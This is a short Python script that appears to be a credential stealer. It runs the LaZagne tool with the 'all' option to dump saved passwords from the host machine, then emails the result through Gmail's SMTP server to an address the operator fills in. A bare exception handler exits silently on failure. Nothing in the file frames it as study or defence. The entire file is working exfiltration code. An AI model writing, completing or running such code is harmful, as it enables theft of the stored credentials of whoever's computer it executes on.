import subprocess, smtplib, sys

class Execute_and_report():

    try:
        def send_email(self, email, password, message):
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()


        def start_report(self):
            result = subprocess.check_output("lazagne.exe all", shell=True)
            self.send_email("Your Gmail", "Your Gmail Password", result)
    except:

        sys.exit()

        
execute = Execute_and_report()
execute.start_report()
